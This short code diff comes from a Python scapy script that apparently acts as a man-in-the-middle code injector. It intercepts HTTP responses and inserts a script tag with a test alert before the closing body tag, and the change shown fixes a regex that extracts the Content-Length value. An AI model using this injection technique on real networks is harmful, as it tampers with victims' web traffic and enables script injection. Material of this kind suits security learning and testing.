@@ -25,9 +25,9 @@ def process_packet(packet):
         elif http_packet[scapy.TCP].sport == 80:
             print("[+] Response...")
             load = load.replace("</body>", "<scrip>alert('test');</script></body>")
-            content_length_search = re.search("Content-Length:\\s\\d*", load)
+            content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
             if content_length_search:
-                content_length = content_length_search.group(0)
+                content_length = content_length_search.group(1)
                 print(content_length)
 
         if load != http_packet[scapy.Raw].load:
